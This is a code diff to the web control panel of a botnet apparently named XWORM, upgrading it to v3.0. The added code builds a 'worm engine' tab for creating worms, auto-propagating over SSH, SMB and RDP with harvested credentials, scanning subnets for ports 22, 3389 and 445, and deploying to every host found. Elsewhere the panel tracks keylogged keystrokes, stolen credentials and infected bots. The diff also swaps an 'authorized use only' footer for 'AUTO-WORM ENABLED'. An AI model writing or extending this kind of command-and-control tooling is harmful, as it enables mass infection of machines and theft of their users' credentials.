@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>XWORM</title>
+<title>XWORM - ADVANCED C2</title>
 <link href="https://fonts.googleapis.com/css2?family=Share+Tech+Mono&family=Rajdhani:wght@400;500;600;700&display=swap" rel="stylesheet">
 <style>
 :root {
@@ -21,6 +21,8 @@
   --text2: #666666;
   --border: #1a1a1a;
   --border-red: #330000;
+  --worm: #ff4400;
+  --worm-dim: rgba(255,68,0,0.1);
 }
 
 * { margin:0; padding:0; box-sizing:border-box; }
@@ -289,6 +291,14 @@ body::before {
   background: var(--red-dim);
   text-shadow: 0 0 8px rgba(255,0,0,0.5);
 }
+.tab.worm-tab {
+  color: var(--worm);
+}
+.tab.worm-tab.active {
+  color: var(--worm);
+  border-bottom-color: var(--worm);
+  background: var(--worm-dim);
+}
 
 /* CONTENT AREA */
 .content {
@@ -335,6 +345,7 @@ body::before {
 /* Grid layouts */
 .grid-2 { display: grid; grid-template-columns: 1fr 1fr; gap: 12px; }
 .grid-3 { display: grid; grid-template-columns: 1fr 1fr 1fr; gap: 12px; }
+.grid-4 { display: grid; grid-template-columns: repeat(4, 1fr); gap: 12px; }
 .col-flex { display: flex; flex-direction: column; gap: 12px; }
 
 /* Tables */
@@ -376,10 +387,12 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
 }
 .badge-active { background: rgba(0,255,65,0.08); color: #00ff41; border: 1px solid rgba(0,255,65,0.2); }
 .badge-dead   { background: rgba(255,0,0,0.08);  color: var(--red); border: 1px solid var(--border-red); }
+.badge-worm   { background: rgba(255,68,0,0.08); color: var(--worm); border: 1px solid var(--worm); }
 
 .dot { width: 6px; height: 6px; border-radius: 50%; }
 .dot-active { background: #00ff41; box-shadow: 0 0 6px #00ff41; animation: blink 1.5s infinite; }
 .dot-dead   { background: var(--red); }
+.dot-worm   { background: var(--worm); box-shadow: 0 0 6px var(--worm); }
 @keyframes blink { 0%,100% { opacity:1; } 50% { opacity:0.3; } }
 
 /* Forms */
@@ -428,6 +441,12 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   border: 1px solid var(--red);
 }
 .btn-red:hover { background: var(--red2); color: #fff; box-shadow: 0 0 15px rgba(255,0,0,0.3); }
+.btn-worm {
+  background: rgba(255,68,0,0.2);
+  color: var(--worm);
+  border: 1px solid var(--worm);
+}
+.btn-worm:hover { background: var(--worm); color: #000; box-shadow: 0 0 15px rgba(255,68,0,0.5); }
 .btn-outline {
   background: transparent;
   color: var(--text2);
@@ -459,6 +478,7 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
 .t-cmd { color: var(--red); }
 .t-err { color: var(--red); }
 .t-prompt { color: var(--red); }
+.t-worm { color: var(--worm); }
 
 /* Upload area */
 .upload-area {
@@ -498,6 +518,14 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   box-shadow: 0 0 20px rgba(255,0,0,0.08);
 }
 
+/* Worm panel */
+.worm-panel {
+  border-color: var(--worm) !important;
+}
+.worm-panel .panel-head {
+  color: var(--worm);
+}
+
 /* Dashboard grid layout */
 #pane-dashboard {
   display: grid;
@@ -528,6 +556,9 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
 /* Plugins pane */
 #pane-plugins { gap: 12px; }
 
+/* Worm pane */
+#pane-worm { gap: 12px; }
+
 /* Settings pane */
 #pane-settings { gap: 12px; max-width: 600px; }
 
@@ -545,6 +576,14 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   font-size: 0.7rem;
   font-family: 'Share Tech Mono', monospace;
 }
+.tag-worm {
+  background: rgba(255,68,0,0.1);
+  color: var(--worm);
+  border: 1px solid var(--worm);
+  padding: 1px 6px;
+  font-size: 0.7rem;
+  font-family: 'Share Tech Mono', monospace;
+}
 
 .pct-bar-wrap {
   background: var(--bg2);
@@ -553,6 +592,7 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   border: 1px solid var(--border);
 }
 .pct-bar { height: 100%; background: var(--red); transition: width 0.5s; }
+.pct-bar-worm { background: var(--worm); }
 
 /* Importance color */
 .imp-high { color: var(--red); text-shadow: 0 0 6px var(--red); }
@@ -576,6 +616,20 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   align-items: center;
   justify-content: space-between;
 }
+
+/* Worm item */
+.worm-item {
+  background: var(--bg2);
+  border: 1px solid var(--worm);
+  padding: 12px;
+  margin-bottom: 8px;
+  display: flex;
+  align-items: center;
+  justify-content: space-between;
+}
+.worm-item.active { border-color: var(--worm); box-shadow: 0 0 10px rgba(255,68,0,0.2); }
+.worm-item.paused { border-color: var(--text2); opacity: 0.7; }
+.worm-item.killed { border-color: var(--red); opacity: 0.5; }
 
 /* Screenshot thumbnail */
 .screenshot-thumb {
@@ -602,6 +656,51 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   max-height: 90%;
   border: 2px solid var(--red);
 }
+
+/* Progress bar */
+.progress {
+  background: var(--bg2);
+  height: 20px;
+  border: 1px solid var(--border-red);
+  position: relative;
+  margin: 5px 0;
+}
+.progress-bar {
+  height: 100%;
+  background: var(--worm);
+  transition: width 0.3s;
+}
+.progress-text {
+  position: absolute;
+  top: 0;
+  left: 0;
+  right: 0;
+  text-align: center;
+  color: #fff;
+  font-size: 0.7rem;
+  line-height: 20px;
+  text-shadow: 1px 1px 1px #000;
+}
+
+/* Metric cards */
+.metric-card {
+  background: var(--bg2);
+  border: 1px solid var(--border-red);
+  padding: 12px;
+  text-align: center;
+}
+.metric-value {
+  font-family: 'Share Tech Mono', monospace;
+  font-size: 1.8rem;
+  color: var(--worm);
+  text-shadow: 0 0 10px var(--worm);
+}
+.metric-label {
+  font-size: 0.7rem;
+  color: var(--text2);
+  text-transform: uppercase;
+  letter-spacing: 1px;
+}
 </style>
 </head>
 <body>
@@ -625,13 +724,14 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
   <!-- Header -->
   <div class="header">
     <div class="brand">
-      ☠ XWORM<span class="brand-ver">v2.0</span>
+      ☠ XWORM<span class="brand-ver">v3.0</span>
     </div>
     <div class="header-stats">
       <div class="hstat"><div class="hstat-val" id="sActive">0</div><div class="hstat-lbl">Active</div></div>
       <div class="hstat"><div class="hstat-val" id="sTotal">0</div><div class="hstat-lbl">Total</div></div>
       <div class="hstat"><div class="hstat-val" id="sKeys">0</div><div class="hstat-lbl">Keylog</div></div>
       <div class="hstat"><div class="hstat-val" id="sCreds">0</div><div class="hstat-lbl">Creds</div></div>
+      <div class="hstat"><div class="hstat-val" id="sWorms">0</div><div class="hstat-lbl">Worms</div></div>
     </div>
     <div class="header-right">
       <div class="sys-time" id="sysTime">--:--:--</div>
@@ -646,6 +746,7 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
     <div class="tab" onclick="switchTab('terminal')">💻 TERMINAL</div>
     <div class="tab" onclick="switchTab('attacks')">☠ ATTACKS</div>
     <div class="tab" onclick="switchTab('data')">📁 CAPTURED</div>
+    <div class="tab worm-tab" onclick="switchTab('worm')">🧬 WORM ENGINE</div>
     <div class="tab" onclick="switchTab('plugins')">🔌 PLUGINS</div>
     <div class="tab" onclick="switchTab('settings')">⚙ SETTINGS</div>
   </div>
@@ -694,12 +795,12 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
         </div>
       </div>
 
-      <!-- Screenshots -->
-      <div class="panel col-flex" style="overflow:hidden;">
-        <div class="panel-head"><div class="panel-head-left">📸 SCREENSHOTS</div></div>
+      <!-- Worm Stats -->
+      <div class="panel worm-panel col-flex" style="overflow:hidden;">
+        <div class="panel-head"><div class="panel-head-left">🧬 WORM ACTIVITY</div></div>
         <div class="tbl-wrap">
-          <table><thead><tr><th>Time</th><th>Bot</th><th>Preview</th></tr></thead>
-          <tbody id="tbScreenshots"></tbody></table>
+          <table><thead><tr><th>Metric</th><th>Value</th></tr></thead>
+          <tbody id="tbWormStats"></tbody></table>
         </div>
       </div>
     </div>
@@ -719,7 +820,7 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
             <thead><tr>
               <th><input type="checkbox" onchange="toggleAll(this)" style="accent-color:var(--red);"></th>
               <th>IP Address</th><th>Hostname</th><th>User</th><th>OS</th>
-              <th>Status</th><th>Last Seen</th><th>Actions</th>
+              <th>Status</th><th>Worm Ver</th><th>Last Seen</th><th>Actions</th>
             </tr></thead>
             <tbody id="tbBots"></tbody>
           </table>
@@ -823,6 +924,130 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
       </div>
     </div>
 
+    <!-- WORM TAB -->
+    <div id="pane-worm" class="tab-pane" style="flex-direction:column;gap:12px;overflow-y:auto;">
+      <!-- Worm Stats Overview -->
+      <div class="grid-4" style="flex-shrink:0;">
+        <div class="metric-card">
+          <div class="metric-value" id="wormTotalInfections">0</div>
+          <div class="metric-label">Total Infections</div>
+        </div>
+        <div class="metric-card">
+          <div class="metric-value" id="wormActiveWorms">0</div>
+          <div class="metric-label">Active Worms</div>
+        </div>
+        <div class="metric-card">
+          <div class="metric-value" id="wormSuccessRate">0%</div>
+          <div class="metric-label">Success Rate</div>
+        </div>
+        <div class="metric-card">
+          <div class="metric-value" id="wormPendingTasks">0</div>
+          <div class="metric-label">Pending Tasks</div>
+        </div>
+      </div>
+
+      <!-- Worm Control Panel -->
+      <div class="panel worm-panel" style="flex-shrink:0;">
+        <div class="panel-head">
+          <div class="panel-head-left">🧬 WORM PROPAGATION ENGINE</div>
+          <span class="tag-worm" id="wormEngineStatus">INACTIVE</span>
+        </div>
+        <div style="padding:14px;display:grid;grid-template-columns:2fr 1fr;gap:12px;">
+          <div>
+            <div class="f-group">
+              <label class="f-label">Auto-Propagation</label>
+              <div style="display:flex;gap:10px;">
+                <button class="btn btn-worm" onclick="startWormEngine()" id="wormStartBtn">▶ START ENGINE</button>
+                <button class="btn btn-outline" onclick="stopWormEngine()" id="wormStopBtn" style="display:none;">⏹ STOP ENGINE</button>
+              </div>
+            </div>
+            <div class="f-group">
+              <label class="f-label">Propagation Rules</label>
+              <div class="grid-2" style="gap:8px;">
+                <div><input type="checkbox" id="ruleUseCreds" checked> <span style="font-size:0.8rem;">Use harvested credentials</span></div>
+                <div><input type="checkbox" id="ruleUseSSH" checked> <span style="font-size:0.8rem;">SSH propagation</span></div>
+                <div><input type="checkbox" id="ruleUseSMB" checked> <span style="font-size:0.8rem;">SMB propagation</span></div>
+                <div><input type="checkbox" id="ruleUseRDP" checked> <span style="font-size:0.8rem;">RDP propagation</span></div>
+              </div>
+            </div>
+          </div>
+          <div>
+            <div class="f-group">
+              <label class="f-label">Scan Interval (sec)</label>
+              <input class="f-input" type="number" id="wormScanInterval" value="300">
+            </div>
+            <div class="f-group">
+              <label class="f-label">Max Concurrent</label>
+              <input class="f-input" type="number" id="wormMaxConcurrent" value="50">
+            </div>
+          </div>
+        </div>
+      </div>
+
+      <!-- Create New Worm -->
+      <div class="panel" style="flex-shrink:0;">
+        <div class="panel-head"><div class="panel-head-left">➕ CREATE NEW WORM</div></div>
+        <div style="padding:14px;display:grid;grid-template-columns:repeat(4,1fr);gap:12px;">
+          <div class="f-group">
+            <label class="f-label">Worm Name</label>
+            <input class="f-input" id="wormName" value="AutoWorm">
+          </div>
+          <div class="f-group">
+            <label class="f-label">Version</label>
+            <input class="f-input" id="wormVersion" value="1.0">
+          </div>
+          <div class="f-group">
+            <label class="f-label">Max Infections</label>
+            <input class="f-input" type="number" id="wormMaxInfections" value="1000">
+          </div>
+          <div class="f-group" style="display:flex;align-items:flex-end;">
+            <button class="btn btn-worm" onclick="createWorm()" style="width:100%;">🚀 CREATE WORM</button>
+          </div>
+        </div>
+      </div>
+
+      <!-- Active Worms List -->
+      <div class="panel" style="flex:1;display:flex;flex-direction:column;overflow:hidden;">
+        <div class="panel-head"><div class="panel-head-left">📋 ACTIVE WORMS</div></div>
+        <div style="padding:14px;overflow-y:auto;flex:1;" id="wormList"></div>
+      </div>
+
+      <!-- Worm Tasks -->
+      <div class="panel" style="flex:1;display:flex;flex-direction:column;overflow:hidden;">
+        <div class="panel-head">
+          <div class="panel-head-left">📊 WORM TASKS</div>
+          <button class="btn-ghost" onclick="loadWormTasks()">↻ REFRESH</button>
+        </div>
+        <div class="tbl-wrap">
+          <table>
+            <thead><tr><th>Time</th><th>Type</th><th>Target</th><th>Status</th></tr></thead>
+            <tbody id="tbWormTasks"></tbody>
+          </table>
+        </div>
+      </div>
+
+      <!-- Network Scanner -->
+      <div class="panel" style="flex-shrink:0;">
+        <div class="panel-head"><div class="panel-head-left">🔍 NETWORK SCANNER</div></div>
+        <div style="padding:14px;display:grid;grid-template-columns:1fr 1fr 1fr auto;gap:12px;">
+          <div class="f-group">
+            <label class="f-label">Network (e.g., 192.168.1)</label>
+            <input class="f-input" id="scanNetwork" value="192.168.1">
+          </div>
+          <div class="f-group">
+            <label class="f-label">Ports</label>
+            <input class="f-input" id="scanPorts" value="22,3389,445">
+          </div>
+          <div class="f-group" style="display:flex;align-items:flex-end;">
+            <button class="btn btn-outline" onclick="scanNetwork()" style="width:100%;">🔍 SCAN NETWORK</button>
+          </div>
+          <div class="f-group" style="display:flex;align-items:flex-end;">
+            <button class="btn btn-worm" onclick="deployToNetwork()">📡 DEPLOY TO ALL</button>
+          </div>
+        </div>
+      </div>
+    </div>
+
     <!-- PLUGINS TAB -->
     <div id="pane-plugins" class="tab-pane" style="flex-direction:column;gap:12px;">
       <div style="display:grid;grid-template-columns:1fr 1fr;gap:12px;flex:1;overflow:hidden;">
@@ -905,7 +1130,8 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
     <div class="sb-item">STATUS: <span id="connStatus">CONNECTING...</span></div>
     <div class="sb-item">C2: <span id="c2Addr">localhost:5000</span></div>
     <div class="sb-item">UPTIME: <span id="uptime">00:00:00</span></div>
-    <div class="sb-item" style="margin-left:auto;">XWORM C2 v2.0 — AUTHORIZED USE ONLY</div>
+    <div class="sb-item">WORM: <span id="wormStatus">STOPPED</span></div>
+    <div class="sb-item" style="margin-left:auto;">XWORM C2 v3.0 — AUTO-WORM ENABLED</div>
   </div>
 </div>
 
@@ -941,20 +1167,19 @@ tr:hover td { background: var(--red-dim); color: var(--text); }
 })();
 
 // ─── CONFIGURATION ────────────────────────────────────────────────────────────
-const API_BASE = window.location.origin;  // Same origin for Render
-let authToken = btoa(':');  // Will be set after login
+const API_BASE = window.location.origin;
+let authToken = btoa(':');
 let activeBots = [];
 let stats = { total_bots: 0, active_bots: 0, total_keystrokes: 0, total_credentials: 0 };
+let wormStats = { total_infections: 0, active_worms: 0, successful_exploits: 0, failed_attempts: 0 };
 
 // ─── AUTH ─────────────────────────────────────────────────────────────────────
 function login() {
   const u = document.getElementById('u').value;
   const p = document.getElementById('p').value;
   
-  // Store for Basic Auth
   authToken = btoa(`${u}:${p}`);
   
-  // Test login
   fetch(`${API_BASE}/api/login-test`, {
     headers: { 'Authorization': `Basic ${authToken}` }
   })
@@ -1023,13 +1248,17 @@ async function init() {
     loadFullCreds(),
     loadFiles(),
     loadPlugins(),
-    loadCurrentCreds()
+    loadCurrentCreds(),
+    loadWormStats(),
+    loadWorms(),
+    loadWormTasks()
   ]);
   
   // Set up intervals for auto-refresh
   setInterval(() => { loadStats(); loadBots(); }, 5000);
   setInterval(loadKS, 3000);
   setInterval(loadCreds, 5000);
+  setInterval(loadWormStats, 10000);
   setInterval(updateTime, 1000);
   setInterval(updateUptime, 1000);
   
@@ -1054,7 +1283,7 @@ function updateUptime() {
 function switchTab(name) {
   document.querySelectorAll('.tab').forEach(t => t.classList.remove('active'));
   document.querySelectorAll('.tab-pane').forEach(p => { p.classList.remove('active'); p.style.display='none'; });
-  const tabs = ['dashboard','bots','terminal','attacks','data','plugins','settings'];
+  const tabs = ['dashboard','bots','terminal','attacks','data','worm','plugins','settings'];
   document.querySelectorAll('.tab')[tabs.indexOf(name)].classList.add('active');
   const pane = document.getElementById('pane-'+name);
   pane.classList.add('active');
@@ -1064,6 +1293,7 @@ function switchTab(name) {
   // Refresh data when switching to certain tabs
   if(name === 'bots') loadBots();
   if(name === 'data') { loadFullCreds(); loadFiles(); }
+  if(name === 'worm') { loadWormStats(); loadWorms(); loadWormTasks(); }
   if(name === 'plugins') loadPlugins();
 }
 
@@ -1078,6 +1308,13 @@ async function loadStats() {
     document.getElementById('sTotal').textContent = data.total_bots || 0;
     document.getElementById('sKeys').textContent = data.total_keystrokes || 0;
     document.getElementById('sCreds').textContent = data.total_credentials || 0;
+    document.getElementById('sWorms').textContent = data.worm_stats?.active_worms || 0;
+    
+    // Update worm stats in dashboard
+    if(data.worm_stats) {
+      wormStats = data.worm_stats;
+      updateWormDashboardStats();
+    }
   } catch(e) {
     console.error('Failed to load stats:', e);
   }
@@ -1247,8 +1484,8 @@ async function loadFiles() {
       (r.files || []).forEach(f => {
         const tr = tb.insertRow();
         tr.insertCell().textContent = r.ip;
-        tr.insertCell().textContent = f;
-        tr.insertCell().textContent = '--'; // Size not stored in current model
+        tr.insertCell().textContent = f.path || f;
+        tr.insertCell().textContent = f.size ? `${Math.round(f.size/1024)}KB` : '--';
       });
     });
   } catch(e) {
@@ -1284,6 +1521,7 @@ async function loadBots() {
       tr.insertCell().textContent = b.username;
       tr.insertCell().textContent = b.os_info;
       tr.insertCell().innerHTML = `<span class="badge ${b.status==='active'?'badge-active':'badge-dead'}"><span class="dot ${b.status==='active'?'dot-active':'dot-dead'}"></span>${b.status.toUpperCase()}</span>`;
+      tr.insertCell().innerHTML = b.worm_version ? `<span class="badge badge-worm">v${b.worm_version}</span>` : '-';
       tr.insertCell().textContent = new Date(b.last_seen).toLocaleString();
       tr.insertCell().innerHTML = `<button class="btn-ghost btn" onclick="termTo('${b.ip}')">TERM</button> <button class="btn-ghost btn" style="color:var(--red)" onclick="killBot('${b.ip}')">KILL</button>`;
       
@@ -1298,6 +1536,239 @@ async function loadBots() {
     document.getElementById('botCount').textContent = activeBots.length + ' ONLINE';
   } catch(e) {
     console.error('Failed to load bots:', e);
+  }
+}
+
+// ─── WORM STATS ───────────────────────────────────────────────────────────────
+async function loadWormStats() {
+  try {
+    const data = await apiCall('/api/worm/stats');
+    if(!data) return;
+    
+    wormStats = data;
+    updateWormDashboardStats();
+    
+    // Update worm status in header
+    document.getElementById('wormStatus').textContent = data.active_worms > 0 ? 'ACTIVE' : 'STOPPED';
+    
+  } catch(e) {
+    console.error('Failed to load worm stats:', e);
+  }
+}
+
+function updateWormDashboardStats() {
+  document.getElementById('wormTotalInfections').textContent = wormStats.total_infections || 0;
+  document.getElementById('wormActiveWorms').textContent = wormStats.active_worms || 0;
+  
+  const total = (wormStats.successful_exploits || 0) + (wormStats.failed_attempts || 0);
+  const rate = total > 0 ? Math.round((wormStats.successful_exploits / total) * 100) : 0;
+  document.getElementById('wormSuccessRate').textContent = rate + '%';
+  document.getElementById('wormPendingTasks').textContent = wormStats.pending_tasks || 0;
+  
+  // Update dashboard worm stats table
+  const tb = document.getElementById('tbWormStats');
+  if(tb) {
+    tb.innerHTML = `
+      <tr><td>Total Infections</td><td>${wormStats.total_infections || 0}</td></tr>
+      <tr><td>Active Worms</td><td>${wormStats.active_worms || 0}</td></tr>
+      <tr><td>Successful Exploits</td><td>${wormStats.successful_exploits || 0}</td></tr>
+      <tr><td>Failed Attempts</td><td>${wormStats.failed_attempts || 0}</td></tr>
+      <tr><td>Harvested Creds</td><td>${wormStats.harvested_credentials || 0}</td></tr>
+      <tr><td>Pending Tasks</td><td>${wormStats.pending_tasks || 0}</td></tr>
+    `;
+  }
+}
+
+// ─── WORMS ────────────────────────────────────────────────────────────────────
+async function loadWorms() {
+  try {
+    const data = await apiCall('/api/worms');
+    if(!data) return;
+    
+    const el = document.getElementById('wormList');
+    el.innerHTML = '';
+    
+    Object.entries(data).forEach(([id, worm]) => {
+      const statusClass = worm.status === 'active' ? 'active' : (worm.status === 'paused' ? 'paused' : 'killed');
+      el.innerHTML += `
+        <div class="worm-item ${statusClass}">
+          <div style="flex:1;">
+            <div style="display:flex;align-items:center;gap:10px;margin-bottom:5px;">
+              <span style="color:var(--worm);font-family:'Share Tech Mono',monospace;font-size:1rem;">
+                🧬 ${worm.name || 'Unnamed'} <span style="color:var(--text2);font-size:0.7rem;">v${worm.version}</span>
+              </span>
+              <span class="tag-worm">${worm.status.toUpperCase()}</span>
+              <span style="color:var(--text2);font-size:0.7rem;">ID: ${id}</span>
+            </div>
+            <div style="display:grid;grid-template-columns:repeat(4,1fr);gap:5px;font-size:0.75rem;">
+              <div>Infections: ${worm.current_infections || 0}/${worm.max_infections || '∞'}</div>
+              <div>Methods: ${(worm.propagation_methods || []).join(', ')}</div>
+              <div>Created: ${new Date(worm.created_at).toLocaleString()}</div>
+              <div>
+                <button class="btn-ghost" onclick="activateWorm('${id}')" ${worm.status==='active'?'disabled':''}>▶</button>
+                <button class="btn-ghost" onclick="pauseWorm('${id}')" ${worm.status!=='active'?'disabled':''}>⏸</button>
+                <button class="btn-ghost" style="color:var(--red)" onclick="killWorm('${id}')">💀</button>
+              </div>
+            </div>
+          </div>
+        </div>`;
+    });
+  } catch(e) {
+    console.error('Failed to load worms:', e);
+  }
+}
+
+// ─── WORM TASKS ───────────────────────────────────────────────────────────────
+async function loadWormTasks() {
+  try {
+    const data = await apiCall('/api/worm/tasks?limit=50');
+    if(!data) return;
+    
+    const tb = document.getElementById('tbWormTasks');
+    tb.innerHTML = '';
+    
+    data.forEach(task => {
+      const tr = tb.insertRow();
+      tr.insertCell().textContent = new Date(task.created_at).toLocaleString();
+      tr.insertCell().innerHTML = `<span class="tag-${task.task_type === 'propagate' ? 'worm' : 'red'}">${task.task_type}</span>`;
+      tr.insertCell().textContent = task.target_ip;
+      tr.insertCell().innerHTML = `<span class="badge ${task.status}">${task.status}</span>`;
+    });
+  } catch(e) {
+    console.error('Failed to load worm tasks:', e);
+  }
+}
+
+// ─── WORM ACTIONS ─────────────────────────────────────────────────────────────
+async function startWormEngine() {
+  try {
+    await apiCall('/api/worm/propagation/start', { method: 'POST' });
+    document.getElementById('wormStartBtn').style.display = 'none';
+    document.getElementById('wormStopBtn').style.display = 'inline-block';
+    document.getElementById('wormEngineStatus').textContent = 'ACTIVE';
+    document.getElementById('wormEngineStatus').className = 'tag-worm';
+    termLog('atkLog', '🧬 Worm propagation engine STARTED', false);
+  } catch(e) {
+    alert('Failed to start worm engine: ' + e.message);
+  }
+}
+
+async function stopWormEngine() {
+  try {
+    await apiCall('/api/worm/propagation/stop', { method: 'POST' });
+    document.getElementById('wormStartBtn').style.display = 'inline-block';
+    document.getElementById('wormStopBtn').style.display = 'none';
+    document.getElementById('wormEngineStatus').textContent = 'INACTIVE';
+    document.getElementById('wormEngineStatus').className = 'tag-red';
+    termLog('atkLog', '🧬 Worm propagation engine STOPPED', true);
+  } catch(e) {
+    alert('Failed to stop worm engine: ' + e.message);
+  }
+}
+
+async function createWorm() {
+  const name = document.getElementById('wormName').value;
+  const version = document.getElementById('wormVersion').value;
+  const maxInfections = parseInt(document.getElementById('wormMaxInfections').value);
+  
+  const methods = [];
+  if(document.getElementById('ruleUseSSH').checked) methods.push('ssh');
+  if(document.getElementById('ruleUseSMB').checked) methods.push('smb');
+  if(document.getElementById('ruleUseRDP').checked) methods.push('rdp');
+  
+  try {
+    const result = await apiCall('/api/worm/create', {
+      method: 'POST',
+      body: JSON.stringify({
+        name: name,
+        version: version,
+        auto_propagate: true,
+        propagation_methods: methods,
+        max_infections: maxInfections,
+        status: 'active'
+      })
+    });
+    
+    alert(`Worm created with ID: ${result.worm_id}`);
+    loadWorms();
+  } catch(e) {
+    alert('Failed to create worm: ' + e.message);
+  }
+}
+
+async function activateWorm(id) {
+  try {
+    await apiCall(`/api/worm/${id}/activate`, { method: 'POST' });
+    loadWorms();
+  } catch(e) {
+    alert('Failed to activate worm: ' + e.message);
+  }
+}
+
+async function pauseWorm(id) {
+  try {
+    await apiCall(`/api/worm/${id}/pause`, { method: 'POST' });
+    loadWorms();
+  } catch(e) {
+    alert('Failed to pause worm: ' + e.message);
+  }
+}
+
+async function killWorm(id) {
+  if(confirm('Kill this worm? All its instances will self-destruct.')) {
+    try {
+      await apiCall(`/api/worm/${id}/kill`, { method: 'POST' });
+      loadWorms();
+    } catch(e) {
+      alert('Failed to kill worm: ' + e.message);
+    }
+  }
+}
+
+async function scanNetwork() {
+  const network = document.getElementById('scanNetwork').value;
+  const ports = document.getElementById('scanPorts').value.split(',').map(p => parseInt(p.trim()));
+  
+  try {
+    const result = await apiCall('/api/worm/scan', {
+      method: 'POST',
+      body: JSON.stringify({
+        network: network,
+        ports: ports
+      })
+    });
+    
+    alert(`Scan initiated for ${result.count} targets`);
+    loadWormTasks();
+  } catch(e) {
+    alert('Failed to scan network: ' + e.message);
+  }
+}
+
+async function deployToNetwork() {
+  const network = document.getElementById('scanNetwork').value;
+  const targets = [];
+  
+  // Generate IPs in network
+  for(let i = 1; i <= 254; i++) {
+    targets.push(`${network}.${i}`);
+  }
+  
+  if(confirm(`Deploy worm to ${targets.length} targets in ${network}.0/24?`)) {
+    try {
+      const result = await apiCall('/api/worm/deploy', {
+        method: 'POST',
+        body: JSON.stringify({
+          target_ips: targets.slice(0, 50), // Limit to 50 for safety
+          payload_type: 'standard'
+        })
+      });
+      
+      alert(`Deployment initiated to ${result.deployed.length} targets`);
+      loadWormTasks();
+    } catch(e) {
+      alert('Failed to deploy: ' + e.message);
+    }
   }
 }
 
@@ -1334,7 +1805,7 @@ async function loadPlugins() {
 // ─── CURRENT CREDENTIALS ──────────────────────────────────────────────────────
 async function loadCurrentCreds() {
   try {
-    const data = await apiCall('/api/credentials');
+    const data = await apiCall('/api/current_credentials');
     if(!data) return;
     
     document.getElementById('curUser').value = data.username;
